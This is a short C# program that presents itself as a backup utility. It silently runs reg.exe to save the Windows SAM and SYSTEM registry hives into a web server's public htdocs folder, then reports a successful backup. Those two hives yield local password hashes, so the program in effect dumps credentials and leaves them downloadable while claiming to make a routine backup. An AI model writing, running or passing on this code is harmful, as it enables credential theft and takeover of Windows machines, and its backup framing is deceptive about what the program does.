using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        ExecuteCommand("reg.exe", "save HKLM\\SYSTEM C:\\xampp\\htdocs\\system.bak");
        ExecuteCommand("reg.exe", "save HKLM\\SAM C:\\xampp\\htdocs\\sam.bak");

        Console.WriteLine("Backup completed successfully.");
    }

    static void ExecuteCommand(string command, string arguments)
    {
        Process process = new Process();
        process.StartInfo.FileName = command;
        process.StartInfo.Arguments = arguments;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.CreateNoWindow = true;

        process.Start();

        string output = process.StandardOutput.ReadToEnd();

        process.WaitForExit();

        if (process.ExitCode != 0)
        {
            Console.WriteLine("Error: " + output);
        }
    }
}
